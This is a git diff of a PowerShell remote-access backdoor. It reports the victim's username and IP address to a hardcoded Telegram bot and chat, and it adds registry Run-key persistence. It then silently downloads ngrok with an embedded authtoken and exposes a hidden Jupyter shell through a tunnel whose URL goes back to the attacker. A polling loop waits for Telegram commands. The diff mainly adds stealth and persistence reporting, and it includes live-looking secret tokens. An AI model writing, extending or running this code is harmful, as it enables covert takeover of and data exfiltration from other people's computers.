@@ -71,20 +71,39 @@ function First-offset
 }
 
 
-function start-myshell
+function start-myshell($apiToken,$chat_id,$urlToNG)
 {
-    Param
-    (
-        [Parameter(Mandatory=$true, Position=0)]
-        [string] $apiToken,
-        [Parameter(Mandatory=$true, Position=1)]
-        [string] $chat_id
-    )
+    # Param
+    # (
+    #     [Parameter(Mandatory=$true, Position=0)]
+    #     [string] $apiToken,
+    #     [Parameter(Mandatory=$true, Position=1)]
+    #     [string] $chat_id
+    #     [Parameter(Mandatory=$true, Position=2)]
+    #     [string] $urlToNG
+    # )
 
-    $foo=0
-    $offset = First-offset $apiToken
     $currentuser = [System.Environment]::UserName
+    $currentip = (Test-Connection -ComputerName $env:computername -count 1).IPv4Address.IPAddressToString
     Send-data -data "User $currentuser is Connected!" -chat_id $chat_id -apiToken $apiToken
+    if (-not($urlToNG -eq $null))
+    {
+        Send-data -apiToken $apiToken -chat_id $chat_id -data "Ngrok url of $currentip is : $urlToNG"
+    }
+    $addpers = Add-Run
+    if ($addpers -like "Added")
+    {
+        Send-data -apiToken $apiToken -chat_id $chat_id -data "successfully added program to the registry!"
+    }
+    else{
+        if($addpers -eq $false)
+        {
+           Send-data -apiToken $apiToken -chat_id $chat_id -data "failed to add item to the registry!" 
+        }
+    }
+
+    $offset = First-offset $apiToken
+    $foo = $offset
     while ($true)
     {
         try
@@ -114,18 +133,16 @@ function start-myshell
         {
             $errors = 1
         }
-        
-    }   Start-Sleep -Seconds 1
+        Start-Sleep -Seconds 1  
+    } 
 
 }
 
 function start-ngrok($port,$path)
 {
-    "taskkill /IM ngrok.exe /F" | cmd | Out-Null
+    "taskkill /IM ngrok.exe /F >nul: 2>nul:" | cmd -ErrorAction SilentlyContinue | Out-Null
     $path = "$path\ngrok.exe"
     $arrgs = "http $port"
-    echo $path
-    echo $args
     start-process $path -ArgumentList $arrgs -WindowStyle hidden | Out-Null
 }
 
@@ -167,7 +184,7 @@ function Start-JupShell($port,$pathToNg,$token)
 
     foreach($i in $pro)
     {
-        Stop-Process -Id $i
+        Stop-Process -Id $i -ErrorAction SilentlyContinue | Out-Null
     }
 
     try
@@ -213,7 +230,7 @@ function Add-Run
         }
         if (-not($key.GetValue($name, $null) -eq $null))
         {
-            return $true
+            return "Added"
         }
         else
         {
@@ -224,21 +241,25 @@ function Add-Run
 }
 
 
-
-$path_to_ngrok = "C:\ngrok\ngrok.exe"
-if([System.IO.File]::Exists($path_to_ngrok)-eq $false)
+try
 {
-    mkdir C:\ngrok
-    Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
-    Expand-Archive .\ngrok.zip
-    ngrok config add-authtoken 29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR
+    $path_to_ngrok = "C:\ngrok\ngrok.exe"
+    if([System.IO.File]::Exists($path_to_ngrok)-eq $false)
+    {
+        mkdir C:\ngrok
+        Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
+        Expand-Archive .\ngrok.zip
+        ngrok config add-authtoken 29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR
+    }
+
+
+    $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
+}
+catch{
+    $err = 1
 }
 
-
-$urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
-Send-data -apiToken $apiToken -chat_id $chat_id -data $urlToNG
-start-myshell -apiToken $apiToken -chat_id $chat_id
-
+start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
 
